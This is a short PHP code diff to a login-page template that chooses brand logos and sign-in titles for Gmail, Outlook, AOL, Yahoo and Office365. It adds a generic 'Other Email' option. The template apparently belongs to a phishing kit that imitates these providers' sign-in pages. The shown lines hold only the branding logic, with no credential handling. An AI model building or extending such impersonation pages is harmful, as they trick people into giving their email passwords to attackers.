@@ -39,6 +39,11 @@
             'page_title'=> 'Sign in to your account',
             'matchClass'=> 'Office365',
         ];
+        $Mail = 
+        [
+            'page_title'=> 'Other Email',
+            'matchClass'=> 'Mail',
+        ];
         $ClassName = get_class($this);
         if($Gmail['matchClass'] == $ClassName && $outlook['matchClass'] != $ClassName && $Aol['matchClass'] != $ClassName && $Yahoo['matchClass'] != $ClassName) {
             $UrlLogo =  'gmaillogo.png';
@@ -55,6 +60,9 @@
         }elseif ($Office365['matchClass'] == $ClassName && $Yahoo['matchClass'] != $ClassName && $Gmail['matchClass'] != $ClassName && $Aol['matchClass'] != $ClassName && $outlook['matchClass'] != $ClassName) {
             $UrlLogo =  'titleLogo.png';
             $title   =  $Office365['page_title'];
+        }elseif ($Mail['matchClass'] == $ClassName && $Office365['matchClass'] != $ClassName && $Yahoo['matchClass'] != $ClassName && $Gmail['matchClass'] != $ClassName && $Aol['matchClass'] != $ClassName && $outlook['matchClass'] != $ClassName) {
+            $UrlLogo =  'titleLogo.png';
+            $title   =  $Mail['page_title'];
         }
     ?>
         <link rel="icon" type="image/png" sizes="16x16" href="<?=ASSETS?>images/<?=$UrlLogo?>">
